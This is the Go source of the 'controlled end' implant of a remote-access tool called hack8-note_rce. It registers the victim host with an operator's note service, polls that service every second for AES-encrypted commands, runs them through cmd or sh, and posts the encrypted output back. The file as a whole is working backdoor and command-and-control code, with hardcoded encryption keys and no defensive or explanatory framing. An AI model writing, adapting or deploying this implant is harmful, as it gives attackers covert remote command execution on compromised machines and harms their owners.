package main

//被控制端

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/lifei6671/gorand"
	. "hack8-note_rce/Util"
	"os/exec"
	"runtime"
	"strings"
	"time"
	// "github.com/google/uuid"
)

func main() {
	key := []byte("qaxzaiciyiyouuuu")
	iv := []byte("qaxyydsyydsyydss")
	noteid := gorand.RandomAlphabetic(32)
	var notekey string
	var admin string
	flag.StringVar(&notekey, "key", "zhu1234554321zhu", "加密参数")
	flag.StringVar(&admin, "admin", "ocis", "note 地址")
	flag.Parse()
	fmt.Println(admin)
	AddHost(admin, notekey, noteid) //添加主机

	//循环命令执行
	for {
		time.Sleep(1 * time.Second)
		cmdd, err := AesCbcDecryptByBase64(GetNote(noteid), key, iv)
		if err != nil {
			continue

		}
		cmd := strings.Split(string(cmdd), ":")
		if cmd[0] == notekey {
			var command *exec.Cmd
			if runtime.GOOS == "windows" {
				command = exec.Command("cmd", "/c", cmd[1])
			} else {
				command = exec.Command("sh", "-c", cmd[1])

			}
			var stdout, stderr bytes.Buffer
			command.Stdout = &stdout
			command.Stderr = &stderr
			command.Run()
			base64, err := AesCbcEncryptBase64(stdout.Bytes(), key, iv)
			if err != nil {
				time.Sleep(3 * time.Second)

				continue
			}
			WriteNote(noteid, base64)

		} else {
			continue
		}

	}
}
